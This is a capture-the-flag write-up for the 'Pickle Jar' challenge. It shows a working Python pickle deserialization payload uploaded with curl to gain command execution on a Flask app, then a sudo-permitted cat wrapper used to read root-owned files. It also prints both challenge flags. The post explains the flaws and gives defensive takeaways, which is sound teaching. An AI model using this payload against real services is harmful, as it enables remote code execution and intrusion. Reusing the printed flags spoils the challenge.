---
layout: post
title: "Pickle Jar - Python Pickle Deserialization to Sudo RCE"
description: CTF writeup exploiting Python pickle deserialization vulnerability in a Flask app to achieve RCE, then escalating privileges via a sudo-allowed backup script.
category: hackerdna
tags: [web, ctf, hackerdna, pickle, deserialization, rce, flask, sudo, privesc]
---

## Pickle Jar - CTF Writeup

**Category:** WEB | **Flags:** 2 (User + Root)

Challenge: [https://hackerdna.com](https://hackerdna.com)

## Contents

- [Reconnaissance](#reconnaissance)
- [Pickle Deserialization RCE](#pickle-deserialization-rce)
- [User Flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)
- [Root Flag](#root-flag)

## Reconnaissance

Port 80 - nginx proxying to a Python Flask "DataVault Backup Management Portal" that accepts `.pkl` (pickle) files for "configuration restore".

## Pickle Deserialization RCE

The `/upload` endpoint calls `pickle.loads()` on user-supplied data without any sanitization. Python pickle is inherently insecure — deserializing untrusted data executes arbitrary code.

### Exploit

Create a malicious pickle that runs a command via `subprocess.check_output`:

```python
import pickle
import subprocess

class RCE:
    def __reduce__(self):
        return (subprocess.check_output, (['sh', '-c', '<command>'],))

payload = pickle.dumps(RCE())
```

Upload it to execute commands:

```bash
curl -X POST http://TARGET/upload -F "file=@exploit.pkl"
```

The response includes the command output in the `config` field.

## User Flag

```bash
cat /home/vault/flag-user.txt
```

**User Flag:** `790f26f3-e670-4ea2-b46d-5ad546da0b51`

## Privilege Escalation

The `vault` user can run a script as root without a password:

```
User vault may run the following commands:
    (root) NOPASSWD: /opt/vault/backup-util
```

The script is a simple bash wrapper around `cat`:

```bash
#!/bin/bash
cat "$1"
```

It can read any file as root:

```bash
sudo /opt/vault/backup-util /root/flag-root.txt
```

## Root Flag

**Root Flag:** `24ad4f06-90ad-41a2-9741-fedfc20f6dc3`

## How the Attack Works

Python's `pickle` is not a serialization format for untrusted data — it is a **remote code execution primitive**. A pickle file is a stack-based bytecode program that the `Unpickler` executes instruction-by-instruction during deserialization. When a class implements `__reduce__`, unpickling calls the returned callable with the returned arguments. In our payload, `__reduce__` returns `(subprocess.check_output, [...])`, so `pickle.loads()` executes `subprocess.check_output` on the victim's behalf. The Flask app treated the upload as a "configuration restore" and trusted the bytes without any signature or allowlist, which turned a feature into a shell.

The privilege escalation chain is equally instructive. `backup-util` is a root-owned script that passes the user-supplied filename straight to `cat` with no validation, so `sudo` gives root a file read for any path. `sudo -l` showed `(root) NOPASSWD: /opt/vault/backup-util` — and the script happened to be designed to read whatever path it was given.

## Key Takeaways

- **Never unpickle untrusted data.** If an application must receive serialized objects, use a safe, explicit format like JSON and validate the schema before processing. If pickle is unavoidable, restrict it to authenticated, signed payloads.
- **Validate arguments in privileged scripts.** A "backup utility" that blindly `cat`s an arbitrary path is a root file-read primitive. Restrict arguments to an allowlist (for example, only filenames inside the backup directory).
- **Audit `sudo -l` entitlements.** `NOPASSWD` entries reduce friction but also reduce the barrier for an attacker who already has a low-privilege foothold. Grant the minimum command set needed.
